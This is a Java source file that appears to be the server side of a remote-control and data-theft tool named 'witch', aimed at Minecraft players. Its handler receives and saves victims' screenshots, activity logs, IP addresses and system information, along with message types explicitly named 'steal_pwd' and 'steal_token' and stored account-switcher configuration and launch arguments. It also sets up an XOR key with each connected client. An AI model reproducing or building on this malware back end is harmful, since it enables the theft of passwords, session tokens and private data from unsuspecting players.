package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import me.soda.witch.server.server.Server;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.IP;
import me.soda.witch.shared.Info;
import me.soda.witch.shared.PlayerInfo;
import me.soda.magictcp.Connection;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handle(byte[] bytes, Connection conn, Server server) {
        new me.soda.witch.shared.MessageHandler(server.clientMap.get(conn)).handle(bytes, (msgType, msg) -> {
            Info info = server.clientMap.get(conn);
            int id = info.index;
            server.log("* Received message: " + msgType + " From ID " + id);
            try {
                switch (msgType) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File("data/screenshots", getFileName(msgType + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, (byte[]) msg);
                    }
                    case "skin" -> {
                        String playerName = info.playerData.playerName;
                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, (byte[]) msg);
                    }
                    case "logging" -> {
                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
                        String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                        FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                    }
                    case "player" -> info.playerData = (PlayerInfo) msg;
                    case "ip" -> info.ip = (IP) msg;
                    case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
                        String ext = msgType.equals("systeminfo") ? "txt" : "json";
                        File file = new File("data/data", getFileName(msgType, ext, info.playerData.playerName, true));
                        FileUtil.write(file, GSON.toJson(msg));
                    }
                    case "server_name" -> server.sendUtil.trySend(conn, server, msgType, server.name);
                    case "key" -> {
                        server.sendUtil.trySend(conn, server, msgType, info.randomXOR());
                        info.acceptXOR = true;
                    }
                    default -> server.log("Message: " + msgType + " " + msg);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }
}
